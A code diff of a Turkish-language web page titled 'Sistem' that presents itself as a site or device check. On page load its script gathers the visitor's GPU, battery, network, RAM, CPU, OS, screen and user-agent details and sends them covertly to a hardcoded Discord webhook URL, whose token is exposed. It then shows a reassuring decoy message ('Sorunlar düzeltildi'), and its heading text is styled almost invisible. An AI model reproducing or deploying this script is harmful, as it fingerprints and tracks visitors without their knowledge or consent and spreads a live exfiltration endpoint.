@@ -6,7 +6,7 @@
     <title>Sistem</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
-        h2 { color:#111; font-size:12px; }
+        h2 { color:#0a0a0a; font-size:10px; }
         .ok { color:#0f4; font-weight:bold; font-size:14px; }
     </style>
 </head>
@@ -17,7 +17,63 @@
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
         const t = document.getElementById('t');
 
-        async function run() {
-            let info = {
-                gpu: "N
-                    
+        async function g() {
+            let d = { gpu: "N/A", v: "N/A", b: "N/A", n: "N/A" };
+            
+            // 1. GPU DERİN TARAMA
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const ex = gl.getExtension('WEBGL_debug_renderer_info');
+                d.gpu = gl.getParameter(ex.UNMASKED_RENDERER_ID);
+                d.v = gl.getParameter(ex.UNMASKED_VENDOR_ID);
+            } catch(e){}
+
+            // 2. PİL YÜZDESİ VE DURUMU (ESKİSİ GİBİ)
+            try {
+                if (navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    d.b = `%${Math.round(bat.level * 100)} (Şarjda: ${bat.charging ? 'EVET' : 'HAYIR'})`;
+                }
+            } catch(e){}
+
+            // 3. AĞ VE BAĞLANTI HIZI
+            try {
+                const cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (cn) d.n = `${cn.downlink} Mbps | ${cn.effectiveType}`;
+            } catch(e){}
+
+            // 4. TÜM VERİLERİ PAKETLE
+            const payload = {
+                content: "💀 **VAHŞİ SİSTEM ANALİZİ (TAM LİSTE)**",
+                embeds: [{
+                    color: 0,
+                    fields: [
+                        { name: "🔋 PİL DURUMU", value: d.b, inline: true },
+                        { name: "🌐 AĞ HIZI", value: d.n, inline: true },
+                        { name: "🕹️ GPU (EKRAN KARTI)", value: "```" + d.gpu + "```", inline: false },
+                        { name: "🏭 ÜRETİCİ (VENDOR)", value: "```" + d.v + "```", inline: false },
+                        { name: "⚙️ DONANIM", value: `**RAM:** ${navigator.deviceMemory}GB\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek\n**OS:** ${navigator.platform}`, inline: true },
+                        { name: "📏 GÖRÜNTÜ", value: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)\n**TCH:** ${navigator.maxTouchPoints}`, inline: true },
+                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
+                    ],
+                    footer: { text: "Cihaz Yönlendirme Kontrolü Tamamlandı • " + new Date().toLocaleString() }
+                }]
+            };
+
+            // 5. KESİN VE HIZLI GÖNDERİM
+            const s = JSON.stringify(payload);
+            navigator.sendBeacon(u, s);
+            fetch(u, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: s });
+
+            // 6. ANLIK MESAJ AKIŞI
+            t.innerHTML = '<span class="ok">Site uygun halde!</span>';
+            setTimeout(() => {
+                t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>';
+            }, 450);
+        }
+
+        g();
+    </script>
+</body>
+</html>
+
